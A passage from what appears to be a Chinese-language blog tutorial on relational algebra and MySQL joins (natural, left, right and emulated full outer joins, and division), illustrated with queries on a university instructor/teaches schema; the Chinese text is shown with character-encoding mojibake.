<span class="keyword">year</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+------------+-----------+--------+-----------+--------+----------+------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">10101</span> <span class="operator">|</span> Srinivasan <span class="operator">|</span> Comp.Sci. <span class="operator">|</span>  <span class="number">65000</span> <span class="operator">|</span> CS<span class="number">-101</span>    <span class="operator">|</span>      <span class="number">1</span> <span class="operator">|</span> Fall     <span class="operator">|</span> <span class="number">2017</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">10101</span> <span class="operator">|</span> Srinivasan <span class="operator">|</span> Comp.Sci. <span class="operator">|</span>  <span class="number">65000</span> <span class="operator">|</span> CS<span class="number">-315</span>    <span class="operator">|</span>      <span class="number">1</span> <span class="operator">|</span> Spring   <span class="operator">|</span> <span class="number">2018</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">10101</span> <span class="operator">|</span> Srinivasan <span class="operator">|</span> Comp.Sci. <span class="operator">|</span>  <span class="number">65000</span> <span class="operator">|</span> CS<span class="number">-347</span>    <span class="operator">|</span>      <span class="number">1</span> <span class="operator">|</span> Fall     <span class="operator">|</span> <span class="number">2017</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">12121</span> <span class="operator">|</span> Wu         <span class="operator">|</span> Finance   <span class="operator">|</span>  <span class="number">90000</span> <span class="operator">|</span> FIN<span class="number">-201</span>   <span class="operator">|</span>      <span class="number">1</span> <span class="operator">|</span> Spring   <span class="operator">|</span> <span class="number">2018</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">15151</span> <span class="operator">|</span> Mozart     <span class="operator">|</span> Music     <span class="operator">|</span>  <span class="number">40000</span> <span class="operator">|</span> MU<span class="number">-199</span>    <span class="operator">|</span>      <span class="number">1</span> <span class="operator">|</span> Spring   <span class="operator">|</span> <span class="number">2018</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">22222</span> <span class="operator">|</span> Einstein   <span class="operator">|</span> Physics   <span class="operator">|</span>  <span class="number">95000</span> <span class="operator">|</span> PHY<span class="number">-101</span>   <span class="operator">|</span>      <span class="number">1</span> <span class="operator">|</span> Fall     <span class="operator">|</span> <span class="number">2017</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">32343</span> <span class="operator">|</span> El Said    <span class="operator">|</span> History   <span class="operator">|</span>  <span class="number">60000</span> <span class="operator">|</span> HIS<span class="number">-351</span>   <span class="operator">|</span>      <span class="number">1</span> <span class="operator">|</span> Spring   <span class="operator">|</span> <span class="number">2018</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">45565</span> <span class="operator">|</span> Katz       <span class="operator">|</span> Comp.Sci. <span class="operator">|</span>  <span class="number">75000</span> <span class="operator">|</span> CS<span class="number">-319</span>    <span class="operator">|</span>      <span class="number">1</span> <span class="operator">|</span> Spring   <span class="operator">|</span> <span class="number">2018</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">76766</span> <span class="operator">|</span> Crick      <span class="operator">|</span> Biology   <span class="operator">|</span>  <span class="number">72000</span> <span class="operator">|</span> BIO<span class="number">-101</span>   <span class="operator">|</span>      <span class="number">1</span> <span class="operator">|</span> Summer   <span class="operator">|</span> <span class="number">2017</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">76766</span> <span class="operator">|</span> Crick      <span class="operator">|</span> Biology   <span class="operator">|</span>  <span class="number">72000</span> <span class="operator">|</span> BIO<span class="number">-301</span>   <span class="operator">|</span>      <span class="number">1</span> <span class="operator">|</span> Summer   <span class="operator">|</span> <span class="number">2018</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">83821</span> <span class="operator">|</span> Brandt     <span class="operator">|</span> Comp.Sci. <span class="operator">|</span>  <span class="number">92000</span> <span class="operator">|</span> CS<span class="number">-190</span>    <span class="operator">|</span>      <span class="number">1</span> <span class="operator">|</span> Spring   <span class="operator">|</span> <span class="number">2017</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">98345</span> <span class="operator">|</span> Kim        <span class="operator">|</span> Elec.Eng. <span class="operator">|</span>  <span class="number">80000</span> <span class="operator">|</span> EE<span class="number">-181</span>    <span class="operator">|</span>      <span class="number">1</span> <span class="operator">|</span> Spring   <span class="operator">|</span> <span class="number">2017</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+------------+-----------+--------+-----------+--------+----------+------+</span></span><br><span class="line"><span class="number">12</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>

<p>mysqlä¼šè‡ªåŠ¨æœç´¢ä¸¤ä¸ªè¡¨ä¸­çš„ç›¸åŒå±æ€§,ç„¶åè¿›è¡Œç­‰å€¼è¿æ¥</p>
<p>æ¯”å¦‚æœ‰ä¸¤å¼ è¡¨$S(A,B,C),T(B,C,D)$</p>
<p>æ­¤æ—¶$S\Join T&#x3D;ST(A,B,C,D)$,mysqlä¼šè€ƒè™‘B,Céƒ½ç›¸åŒçš„å…ƒç»„åˆå¹¶æˆåŒä¸€ä¸ªå…ƒç»„,</p>
<p>å¦‚æœ$\exist s(a,b,c,d)\in A,\forall t_i(b_i,c_i,d_i)\in T,!(b&#x3D;b_i \land c&#x3D;c_i)$åˆ™è¯¥Sè¡¨ä¸­çš„så…ƒç»„ä¼šè¢«æŠ›å¼ƒ</p>
<p>åŒç†é€‚ç”¨äºt</p>
<blockquote>
<p>è¯´äººè¯å°±æ˜¯S,Tè¡¨ä¿ç•™å…¬å…±éƒ¨åˆ†å®Œå…¨ç›¸åŒçš„è¡¨é¡¹è¿›è¡Œåˆå¹¶</p>
<p>â€œå…¬å…±éƒ¨åˆ†â€æ˜¯æŒ‡æ‰€æœ‰ç›¸åŒçš„åˆ—å±æ€§</p>
</blockquote>
</blockquote>
<p>é‚£ä¹ˆæœ‰<br>$$<br>r\Join s&#x3D;\Pi_{R\cup S}(\sigma_{r.a_1&#x3D;s.a_1,r.a_2&#x3D;s.a_2,â€¦,r.a_n&#x3D;s.a_n}(r\times s))<br>$$</p>
<p>å…¶ä¸­$a_i\in R\cap S$è¡¨ç¤ºrå’Œså…±æœ‰çš„å±æ€§</p>
<p>æ€ä¹ˆç†è§£è¿™ä¸ªå…¬å¼å‘¢?è¿˜æ˜¯ä»ä¸‹å¾€ä¸Šçœ‹è¿™ä¸ªå…¬å¼</p>
<p>æœ€é‡Œå±‚$r\times s$,ç¬›å¡å°”ç§¯,råˆ°sæ‰€æœ‰è¡Œçš„ç»„åˆéƒ½æœ‰äº†</p>
<p>ç¬¬äºŒå±‚$\sigma_{r.a_1&#x3D;s.a_1,r.a_2&#x3D;s.a_2,â€¦,r.a_n&#x3D;s.a_n}(r\times s)$,åœ¨ç¬¬ä¸€å±‚çš„è®¡ç®—ç»“æœè¡¨ä¸­,å–å‡º$r.a_1&#x3D;s.a_1,r.a_2&#x3D;s.a_2â€¦$çš„è¡Œç»„æˆæ–°çš„å­è¡¨</p>
<p>ç¬¬ä¸‰å±‚$\Pi_{R\cup S}(\sigma_{r.a_1&#x3D;s.a_1,r.a_2&#x3D;s.a_2,â€¦,r.a_n&#x3D;s.a_n}(r\times s))$ä¿ç•™Rå’ŒSæ‰€æœ‰å±æ€§</p>
<h3 id="èµ‹å€¼-leftarrow"><a href="#èµ‹å€¼-leftarrow" class="headerlink" title="èµ‹å€¼$\leftarrow$"></a>èµ‹å€¼$\leftarrow$</h3><p>å¯¹äºåˆšæ‰çš„è‡ªç„¶è¿æ¥,å¯ä»¥ä½¿ç”¨èµ‹å€¼è¿ç®—ä¿å­˜ä¸´æ—¶å˜é‡,åˆ†å¸ƒè®¡ç®—<br>$$<br>\Pi_{name,course_id}(\sigma_{instructor.name&#x3D;Srinivasan}(instructor\Join teaches))<br>$$</p>
<p>$$<br>\begin{aligned}<br>temp1&amp;\leftarrow instructor\Join teaches\<br>temp2&amp;\leftarrow \sigma_{instructor.name&#x3D;Srinivasan}(temp1)\<br>result&amp;\leftarrow \Pi_{name,course_id}(temp2)<br>\end{aligned}<br>$$</p>
<p>ä½†æ˜¯åœ¨mysqlä¸Šæ²¡æœ‰æ‰¾åˆ°è¿™ç§ç”¨æ³•</p>
<h3 id="å¤–è¿æ¥"><a href="#å¤–è¿æ¥" class="headerlink" title="å¤–è¿æ¥"></a>å¤–è¿æ¥</h3><p>è‡ªç„¶è¿æ¥æ—¶,å¦‚æœsè¡¨ä¸­çš„æŸä¸€é¡¹åœ¨rè¡¨ä¸­æ‰¾ä¸åˆ°å…±æœ‰å±æ€§å®Œå…¨ç›¸åŒçš„é¡¹åˆ™ä¼šè¢«æŠ›å¼ƒ,è€Œå¤–è¿æ¥å°†ä¼šä¿ç•™sè¡¨ä¸­çš„è¿™ä¸€é¡¹,å¹¶ç»™ä»–åˆ›å»ºä¸€ä¸ªå…¨ç©ºçš„rè¡¨å¯¹åº”é¡¹</p>
<p>ä¸¾ä¸ªä¾‹å­è¯´</p>
<p>æ•™å¸ˆè¡¨sä¸­çš„æ•™å¸ˆå¯ä»¥åˆ†æˆæ•™å­¦çš„å’Œä¸æ•™å­¦çš„ä¸¤ç±»</p>
<p>è¯¾ç¨‹è¡¨tä¸­çš„è¯¾ç¨‹å¯ä»¥åˆ†æˆè‡ªä¹ è¯¾å’Œæ•™å­¦è¯¾ä¸¤ç±»</p>
<p>$s\Join t$åªä¼šä¿ç•™æ•™è¯¾è€å¸ˆå’Œæ•™å­¦è¯¾,è¿˜å¾—æ˜¯è¿™ä¸ªè€å¸ˆå’Œæ•™çš„è¯¾éƒ½å­˜åœ¨,æ˜¾ç„¶ä¸æ•™å­¦çš„è€å¸ˆä¸ä¼šå‡ºç°åœ¨ç»“æœé‡Œ,è‡ªä¹ è¯¾ä¹Ÿä¸ä¼šå‡ºç°åœ¨ç»“æœé‡Œ</p>
<p>æ¯”å¦‚ç°æœ‰è¯¾ç¨‹è¡¨å’Œæ•™å¸ˆè¡¨</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/WPS%E5%9B%BE%E7%89%87%E6%8B%BC%E5%9B%BE.png" alt="å·¦è¯¾ç¨‹å³æ•™å¸ˆ"></p>
<p>SELF-0è¿™è¯¾å¯¹åº”æ•™å¸ˆID&#x3D;0,ä¸å­˜åœ¨è¿™ä¸ªè€å¸ˆ,æ„å‘³ç€è‡ªä¹ è¯¾,æ˜¾ç„¶åœ¨è‡ªç„¶è¿æ¥çš„æ—¶å€™ä¼šè¢«æ‰¬äº†</p>
<p>ID&#x3D;33456è¿™ä¸ªGoldè€å¸ˆ,åœ¨teachesè¯¾ç¨‹è¡¨ä¸Šæ²¡æœ‰ä»»è¯¾è®°å½•,è‡ªç„¶è¿æ¥çš„æ—¶å€™ä¹Ÿä¼šè¢«æ‰¬äº†</p>
<p>ç°åœ¨ä»¤lè¡¨ç¤ºå·¦è¡¨,ä¹Ÿå°±æ˜¯teaches;ä»¤rè¡¨ç¤ºå³è¡¨,ä¹Ÿå°±æ˜¯instructor</p>
<p>å¯¹äº$teaches \ opt \ instructor$</p>
<p>å¦‚æœæ˜¯optå…¨å¤–è¿æ¥åˆ™è°ä¹Ÿä¸ä¼šè¢«æ‰¬äº†,</p>
<p>å¦‚æœoptæ˜¯å·¦å¤–è¿æ¥åˆ™SELF-0ç•™ä¸‹,33456å·æ•™å¸ˆæ‰¬äº†</p>
<p>å¦‚æœoptæ˜¯å³å¤–è¿æ¥åˆ™SELF-0æ‰¬äº†,33456å·æ•™å¸ˆç•™ä¸‹</p>
<p>å¦‚æœoptæ˜¯å…¨å¤–è¿æ¥åˆ™éƒ½ç•™ä¸‹</p>
<p>è¿™ä¸‰ä¸ªåœ¨$\LaTeX$ä¸­æ²¡æœ‰æ‰¾åˆ°ç¬¦å·</p>
<h4 id="å·¦å¤–è¿æ¥-âŸ•"><a href="#å·¦å¤–è¿æ¥-âŸ•" class="headerlink" title="å·¦å¤–è¿æ¥$âŸ•$"></a>å·¦å¤–è¿æ¥$âŸ•$</h4><p>è°åœ¨å·¦è¾¹è°å…¨ç•™ä¸‹,å³è¾¹çš„è¯¥æ‰¬å°±å¾—æ‰¬</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> teaches <span class="keyword">as</span> l <span class="keyword">LEFT</span> <span class="keyword">OUTER</span> <span class="keyword">JOIN</span> instructor <span class="keyword">as</span> r <span class="keyword">ON</span> l.ID<span class="operator">=</span>r.ID;</span><br><span class="line"><span class="operator">+</span><span class="comment">-------+-----------+--------+----------+------+-------+------------+-----------+--------+</span></span><br><span class="line"><span class="operator">|</span> ID    <span class="operator">|</span> course_id <span class="operator">|</span> sec_id <span class="operator">|</span> semester <span class="operator">|</span> <span class="keyword">year</span> <span class="operator">|</span> ID    <span class="operator">|</span> name       <span class="operator">|</span> dept_name <span class="operator">|</span> salary <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+-----------+--------+----------+------+-------+------------+-----------+--------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">10101</span> <span class="operator">|</span> CS<span class="number">-101</span>    <span class="operator">|</span>      <span class="number">1</span> <span class="operator">|</span> Fall     <span class="operator">|</span> <span class="number">2017</span> <span class="operator">|</span> <span class="number">10101</span> <span class="operator">|</span> Srinivasan <span class="operator">|</span> Comp.Sci. <span class="operator">|</span>  <span class="number">65000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">10101</span> <span class="operator">|</span> CS<span class="number">-315</span>    <span class="operator">|</span>      <span class="number">1</span> <span class="operator">|</span> Spring   <span class="operator">|</span> <span class="number">2018</span> <span class="operator">|</span> <span class="number">10101</span> <span class="operator">|</span> Srinivasan <span class="operator">|</span> Comp.Sci. <span class="operator">|</span>  <span class="number">65000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">10101</span> <span class="operator">|</span> CS<span class="number">-347</span>    <span class="operator">|</span>      <span class="number">1</span> <span class="operator">|</span> Fall     <span class="operator">|</span> <span class="number">2017</span> <span class="operator">|</span> <span class="number">10101</span> <span class="operator">|</span> Srinivasan <span class="operator">|</span> Comp.Sci. <span class="operator">|</span>  <span class="number">65000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">12121</span> <span class="operator">|</span> FIN<span class="number">-201</span>   <span class="operator">|</span>      <span class="number">1</span> <span class="operator">|</span> Spring   <span class="operator">|</span> <span class="number">2018</span> <span class="operator">|</span> <span class="number">12121</span> <span class="operator">|</span> Wu         <span class="operator">|</span> Finance   <span class="operator">|</span>  <span class="number">90000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">15151</span> <span class="operator">|</span> MU<span class="number">-199</span>    <span class="operator">|</span>      <span class="number">1</span> <span class="operator">|</span> Spring   <span class="operator">|</span> <span class="number">2018</span> <span class="operator">|</span> <span class="number">15151</span> <span class="operator">|</span> Mozart     <span class="operator">|</span> Music     <span class="operator">|</span>  <span class="number">40000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">22222</span> <span class="operator">|</span> PHY<span class="number">-101</span>   <span class="operator">|</span>      <span class="number">1</span> <span class="operator">|</span> Fall     <span class="operator">|</span> <span class="number">2017</span> <span class="operator">|</span> <span class="number">22222</span> <span class="operator">|</span> Einstein   <span class="operator">|</span> Physics   <span class="operator">|</span>  <span class="number">95000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">32343</span> <span class="operator">|</span> HIS<span class="number">-351</span>   <span class="operator">|</span>      <span class="number">1</span> <span class="operator">|</span> Spring   <span class="operator">|</span> <span class="number">2018</span> <span class="operator">|</span> <span class="number">32343</span> <span class="operator">|</span> El Said    <span class="operator">|</span> History   <span class="operator">|</span>  <span class="number">60000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">45565</span> <span class="operator">|</span> CS<span class="number">-319</span>    <span class="operator">|</span>      <span class="number">1</span> <span class="operator">|</span> Spring   <span class="operator">|</span> <span class="number">2018</span> <span class="operator">|</span> <span class="number">45565</span> <span class="operator">|</span> Katz       <span class="operator">|</span> Comp.Sci. <span class="operator">|</span>  <span class="number">75000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">76766</span> <span class="operator">|</span> BIO<span class="number">-101</span>   <span class="operator">|</span>      <span class="number">1</span> <span class="operator">|</span> Summer   <span class="operator">|</span> <span class="number">2017</span> <span class="operator">|</span> <span class="number">76766</span> <span class="operator">|</span> Crick      <span class="operator">|</span> Biology   <span class="operator">|</span>  <span class="number">72000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">76766</span> <span class="operator">|</span> BIO<span class="number">-301</span>   <span class="operator">|</span>      <span class="number">1</span> <span class="operator">|</span> Summer   <span class="operator">|</span> <span class="number">2018</span> <span class="operator">|</span> <span class="number">76766</span> <span class="operator">|</span> Crick      <span class="operator">|</span> Biology   <span class="operator">|</span>  <span class="number">72000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">83821</span> <span class="operator">|</span> CS<span class="number">-190</span>    <span class="operator">|</span>      <span class="number">1</span> <span class="operator">|</span> Spring   <span class="operator">|</span> <span class="number">2017</span> <span class="operator">|</span> <span class="number">83821</span> <span class="operator">|</span> Brandt     <span class="operator">|</span> Comp.Sci. <span class="operator">|</span>  <span class="number">92000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">98345</span> <span class="operator">|</span> EE<span class="number">-181</span>    <span class="operator">|</span>      <span class="number">1</span> <span class="operator">|</span> Spring   <span class="operator">|</span> <span class="number">2017</span> <span class="operator">|</span> <span class="number">98345</span> <span class="operator">|</span> Kim        <span class="operator">|</span> Elec.Eng. <span class="operator">|</span>  <span class="number">80000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>     <span class="number">0</span> <span class="operator">|</span> SELF<span class="number">-0</span>    <span class="operator">|</span>      <span class="number">1</span> <span class="operator">|</span> Spring   <span class="operator">|</span> <span class="number">2018</span> <span class="operator">|</span>  <span class="keyword">NULL</span> <span class="operator">|</span> <span class="keyword">NULL</span>       <span class="operator">|</span> <span class="keyword">NULL</span>      <span class="operator">|</span>   <span class="keyword">NULL</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+-----------+--------+----------+------+-------+------------+-----------+--------+</span></span><br><span class="line"><span class="number">13</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>

<p>33456å·è€å¸ˆå·²ç»è¢«æ‰¬äº†</p>
<p>å†™æˆå…³ç³»ä»£æ•°å°±æ˜¯<br>$$<br>\sigma_{l.ID&#x3D;r.ID}(\rho_l(teaches)âŸ•\rho_r(instructor))<br>$$</p>
<h4 id="å³å¤–è¿æ¥-âŸ–"><a href="#å³å¤–è¿æ¥-âŸ–" class="headerlink" title="å³å¤–è¿æ¥$âŸ–$"></a>å³å¤–è¿æ¥$âŸ–$</h4><p>è°åœ¨å³è¾¹è°å…¨ç•™ä¸‹,å·¦è¾¹è¯¥æ‰¬å°±å¾—æ‰¬</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> l.course_id,r.name <span class="keyword">from</span> teaches <span class="keyword">as</span> l <span class="keyword">RIGHT</span> <span class="keyword">OUTER</span> <span class="keyword">JOIN</span> instructor <span class="keyword">as</span> r <span class="keyword">ON</span> l.ID<span class="operator">=</span>r.ID;</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+------------+</span></span><br><span class="line"><span class="operator">|</span> course_id <span class="operator">|</span> name       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+------------+</span></span><br><span class="line"><span class="operator">|</span> CS<span class="number">-101</span>    <span class="operator">|</span> Srinivasan <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> CS<span class="number">-315</span>    <span class="operator">|</span> Srinivasan <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> CS<span class="number">-347</span>    <span class="operator">|</span> Srinivasan <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> FIN<span class="number">-201</span>   <span class="operator">|</span> Wu         <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> MU<span class="number">-199</span>    <span class="operator">|</span> Mozart     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> PHY<span class="number">-101</span>   <span class="operator">|</span> Einstein   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> HIS<span class="number">-351</span>   <span class="operator">|</span> El Said    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> CS<span class="number">-319</span>    <span class="operator">|</span> Katz       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> BIO<span class="number">-101</span>   <span class="operator">|</span> Crick      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> BIO<span class="number">-301</span>   <span class="operator">|</span> Crick      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> CS<span class="number">-190</span>    <span class="operator">|</span> Brandt     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> EE<span class="number">-181</span>    <span class="operator">|</span> Kim        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">NULL</span>      <span class="operator">|</span> Gold       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">NULL</span>      <span class="operator">|</span> Caliiferi  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">NULL</span>      <span class="operator">|</span> Singh      <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+------------+</span></span><br><span class="line"><span class="number">15</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>

<p>SELF-0å·è‡ªä¹ è¯¾å·²ç»è¢«æ‰¬äº†</p>
<p>ä¸‰ä¸ªä¸ä»»è¯¾çš„è€å¸ˆç•™ä¸‹</p>
<p>å†™æˆå…³ç³»ä»£æ•°çš„å½¢å¼å°±æ˜¯<br>$$<br>\Pi_{l.course_id,r.name}(\sigma_{l.ID&#x3D;r.ID}(\rho_l(teaches)âŸ–\rho_r(instructor)))<br>$$</p>
<h4 id="å…¨å¤–è¿æ¥-âŸ—"><a href="#å…¨å¤–è¿æ¥-âŸ—" class="headerlink" title="å…¨å¤–è¿æ¥$âŸ—$"></a>å…¨å¤–è¿æ¥$âŸ—$</h4><p>mysqlä¸­æ²¡æœ‰å…¨å¤–è¿æ¥</p>
<p>ä½†æ˜¯å¯ä»¥ä½¿ç”¨å·¦å¤–è¿æ¥è”åˆæŸ¥è¯¢å³å¤–è¿æ¥</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> l.course_id,r.name</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>     <span class="keyword">from</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>         teaches <span class="keyword">as</span> l</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>             <span class="keyword">LEFT</span> <span class="keyword">OUTER</span> <span class="keyword">JOIN</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>         instructor <span class="keyword">as</span> r</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>             <span class="keyword">ON</span> l.ID<span class="operator">=</span>r.ID</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">union</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">select</span> l.course_id,r.name</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>     <span class="keyword">from</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>         teaches <span class="keyword">as</span> l</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>             <span class="keyword">RIGHT</span> <span class="keyword">OUTER</span> <span class="keyword">JOIN</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>         instructor <span class="keyword">as</span> r</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>             <span class="keyword">ON</span> l.ID<span class="operator">=</span>r.ID</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> ;</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+------------+</span></span><br><span class="line"><span class="operator">|</span> course_id <span class="operator">|</span> name       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+------------+</span></span><br><span class="line"><span class="operator">|</span> CS<span class="number">-101</span>    <span class="operator">|</span> Srinivasan <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> CS<span class="number">-315</span>    <span class="operator">|</span> Srinivasan <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> CS<span class="number">-347</span>    <span class="operator">|</span> Srinivasan <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> FIN<span class="number">-201</span>   <span class="operator">|</span> Wu         <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> MU<span class="number">-199</span>    <span class="operator">|</span> Mozart     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> PHY<span class="number">-101</span>   <span class="operator">|</span> Einstein   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> HIS<span class="number">-351</span>   <span class="operator">|</span> El Said    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> CS<span class="number">-319</span>    <span class="operator">|</span> Katz       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> BIO<span class="number">-101</span>   <span class="operator">|</span> Crick      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> BIO<span class="number">-301</span>   <span class="operator">|</span> Crick      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> CS<span class="number">-190</span>    <span class="operator">|</span> Brandt     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> EE<span class="number">-181</span>    <span class="operator">|</span> Kim        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> SELF<span class="number">-0</span>    <span class="operator">|</span> <span class="keyword">NULL</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">NULL</span>      <span class="operator">|</span> Gold       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">NULL</span>      <span class="operator">|</span> Caliiferi  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">NULL</span>      <span class="operator">|</span> Singh      <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+------------+</span></span><br><span class="line"><span class="number">16</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>

<p>$$<br>\Pi_{l.course_id,r.name}(\sigma_{l.ID&#x3D;r.ID}(\rho_l(teaches)âŸ—\rho_r(instructor)))<br>$$</p>
<h3 id="é™¤-div"><a href="#é™¤-div" class="headerlink" title="é™¤$\div$"></a>é™¤$\div$</h3><p>è®¾å…³ç³»rçš„å±æ€§$R&#x3D;(A_1,A_2,â€¦,A_m,B_1,B_2,â€¦,B_n)$</p>
<p>è®¾å…³ç³»sçš„å±æ€§$S&#x3D;(B_1,B_2,â€¦,B_n)$</p>
<blockquote>
<p>æ‰€è°“å…³ç³»å°±æ˜¯è¡¨</p>
<p>æ‰€è°“å±æ€§å°±æ˜¯è¡¨çš„åˆ—</p>
</blockquote>
<p>åˆ™<br>$$<br>r\div s&#x3D;(A_1,A_2,â€¦,A_m)<br>$$</p>
